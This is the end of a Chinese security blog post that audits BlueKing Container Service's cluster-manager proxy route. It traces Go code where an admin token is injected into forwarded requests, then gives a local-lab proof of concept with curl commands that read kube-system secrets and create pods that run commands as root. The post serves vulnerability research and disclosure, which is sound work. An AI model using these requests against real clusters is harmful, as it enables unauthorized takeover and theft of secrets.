+<p>这里一条路就很清楚了。我们可以通过请求 &#x2F;clustermanager&#x2F;clusters&#x2F;{cluster_id}&#x2F;{sub_path:.*} 路由，服务端会自动取出该集群的管理员令牌、塞进请求头，再把请求转给集群的 kube-apiserver。然后我们关注的是后面的sub_path，应该是我们可控的请求路径。</p>
+<p>回到proxifier.go：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">handlerServer := stripLeaveSlash(f.ExtractPathPrefix(req), websocketHandler)</span><br><span class="line">proxyHandler = &amp;ClusterHandlerInstance&#123;</span><br><span class="line">    Handler: handlerServer,&#125;</span><br><span class="line">proxyHandler.Handler.ServeHTTP(rw, req)</span><br></pre></td></tr></table></figure>
+
+<p>这里调用的相当于是 stripLeaveSlash(f.ExtractPathPrefix(req), websocketHandler) 的ServeHTTP 方法。有对前缀的处理之类的。我们跟进看看。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">func (f *TunnelProxyDispatcher) ExtractPathPrefix(req *http.Request) string &#123;</span><br><span class="line">    subPath := mux.Vars(req)[f.SubPathVarName]</span><br><span class="line">    fullPath := req.URL.Path</span><br><span class="line">    // We need to strip the prefix string before the request can be forward to</span><br><span class="line">apiserver, so we will walk over the full</span><br><span class="line">    // request path backwards, everything before the `sub_path` will be the prefix</span><br><span class="line">we need to strip</span><br><span class="line">    return fullPath[:len(fullPath)-len(subPath)]&#125;</span><br><span class="line">// like http.StripPrefix, but always leaves an initial slash. (so that our</span><br><span class="line">// regexps will work.)</span><br><span class="line">func stripLeaveSlash(prefix string, h http.Handler) http.Handler &#123;</span><br><span class="line">    return http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) &#123;</span><br><span class="line">       blog.Debug(fmt.Sprintf(&quot;begin proxy for: %s&quot;, req.URL.Path))</span><br><span class="line">       p := strings.TrimPrefix(req.URL.Path, prefix)</span><br><span class="line">       if len(p) &gt;= len(req.URL.Path) &#123;</span><br><span class="line">          http.NotFound(w, req)</span><br><span class="line">          return</span><br><span class="line">       &#125;</span><br><span class="line">       if len(p) &gt; 0 &amp;&amp; p[:1] != &quot;/&quot; &#123;</span><br><span class="line">          p = &quot;/&quot; + p</span><br><span class="line">       &#125;</span><br><span class="line">       req.URL.Path = p</span><br><span class="line">       h.ServeHTTP(w, req)</span><br><span class="line">    &#125;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ExtractPathPrefix 是取出前端那段， stripLeaveSlash 是删掉取出的前端那段，保留我们的sub_path。</p>
+<p>现在就可以构造payload了，在kali上搭建一个环境：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:18096/clustermanager/clusters/BCS-K8S-POC/api/v1/namespaces">http://127.0.0.1:18096/clustermanager/clusters/BCS-K8S-POC/api/v1/namespaces</a> <a target="_blank" rel="noopener" href="http://127.0.0.1:18096/clustermanager/clusters/BCS-K8S-POC/api/v1/namespaces/kubesystem/secrets%E4%B8%8A%E8%BF%B0%E5%85%B6%E5%AE%9E%E5%B7%B2%E7%BB%8F%E5%8F%AF%E4%BB%A5%E6%8E%A5%E7%AE%A1%E4%B8%80%E4%B8%AA%E9%9B%86%E7%BE%A4%E4%BA%86%E3%80%82%E7%94%9A%E8%87%B3%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E7%89%B9%E6%9D%83pod%E6%96%B9%E5%BC%8F%E6%9D%A5%E8%BF%9B%E8%A1%8Crce%EF%BC%9A">http://127.0.0.1:18096/clustermanager/clusters/BCS-K8S-POC/api/v1/namespaces/kubesystem/secrets上述其实已经可以接管一个集群了。甚至可以通过特权pod方式来进行rce：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">BASE=http://127.0.0.1:18096/clustermanager/clusters/BCS-K8S-POC</span><br><span class="line">NS=poc-target</span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# curl -s -X POST $BASE/api/v1/namespaces/$NS/pods \</span><br><span class="line">  -H &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">  -d &#x27;&#123;</span><br><span class="line">    &quot;apiVersion&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;,</span><br><span class="line">    &quot;metadata&quot;:&#123;&quot;name&quot;:&quot;unauth-rce-pod&quot;,&quot;namespace&quot;:&quot;poc-target&quot;&#125;,</span><br><span class="line">    &quot;spec&quot;:&#123;&quot;restartPolicy&quot;:&quot;Never&quot;,&quot;activeDeadlineSeconds&quot;:120,</span><br><span class="line">      &quot;containers&quot;:[&#123;&quot;name&quot;:&quot;app&quot;,&quot;image&quot;:&quot;busybox:1.36&quot;,</span><br><span class="line">        &quot;command&quot;:[&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;echo RCE_POD_OK; id; uname -a&quot;]&#125;]&#125;</span><br><span class="line">  &#125;&#x27; -o /dev/null -w &#x27;%&#123;http_code&#125;\n&#x27;</span><br><span class="line">201</span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# sleep 8</span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# curl -s $BASE/api/v1/namespaces/$NS/pods/unauth-rce-pod/log</span><br><span class="line">RCE_POD_OK</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),10(wheel)</span><br><span class="line">Linux unauth-rce-pod 6.18.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.18.12-1kali1</span><br><span class="line">(2026-02-25) x86_64 GNU/Linux</span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# curl -s -X POST $BASE/api/v1/namespaces/$NS/pods \</span><br><span class="line">  -H &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">  -d &#x27;&#123;</span><br><span class="line">    &quot;apiVersion&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;,</span><br><span class="line">    &quot;metadata&quot;:&#123;&quot;name&quot;:&quot;unauth-rce-pod1&quot;,&quot;namespace&quot;:&quot;poc-target&quot;&#125;,</span><br><span class="line">    &quot;spec&quot;:&#123;&quot;restartPolicy&quot;:&quot;Never&quot;,&quot;activeDeadlineSeconds&quot;:120,</span><br><span class="line">      &quot;containers&quot;:[&#123;&quot;name&quot;:&quot;app&quot;,&quot;image&quot;:&quot;busybox:1.36&quot;,</span><br><span class="line">        &quot;command&quot;:[&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;echo RCE_POD_OK; whoami; ifconfig&quot;]&#125;]&#125;</span><br><span class="line">  &#125;&#x27; -o /dev/null -w &#x27;%&#123;http_code&#125;\n&#x27;</span><br><span class="line">201</span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# sleep 8</span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# curl -s $BASE/api/v1/namespaces/$NS/pods/unauth-rce-pod1/log</span><br><span class="line">RCE_POD_OK</span><br><span class="line">root</span><br><span class="line">eth0 Link encap:Ethernet HWaddr C2:F5:6A:B8:FB:DB</span><br><span class="line">          inet addr:10.244.0.13 Bcast:10.244.0.255 Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::c0f5:6aff:feb8:fbdb/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1</span><br><span class="line">          RX packets:5 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:6 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000</span><br><span class="line">          RX bytes:446 (446.0 B) TX bytes:516 (516.0 B)</span><br><span class="line">lo Link encap:Local Loopback</span><br><span class="line">          inet addr:127.0.0.1 Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING MTU:65536 Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000</span><br><span class="line">          RX bytes:0 (0.0 B) TX bytes:0 (0.0 B)</span><br></pre></td></tr></table></figure>
+
+<p>危害性相当大！！！</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Meteor_Kai</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://blog.meteorkai.top/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">https://blog.meteorkai.top/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>CyberSecurity brings me great joy!</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"># 代码审计</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span> | </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2026/09/29/%E5%AD%A6%E4%BA%86%E7%82%B9%E5%AE%89%E5%8D%93%E5%85%8D%E6%9D%80%E5%90%8E%E6%9C%89%E6%84%9F/">学了点安卓免杀后有感</a>
+            
+        </section>
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Meteor_Kai | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">
+            访客数：<span id="busuanzi_value_site_uv"></span>
+        </span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_pv">
+            总访问量：<span id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+    <!-- 不蒜子计数器 -->
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</footer>
+
+    </div>
+</body>
+
+</html>
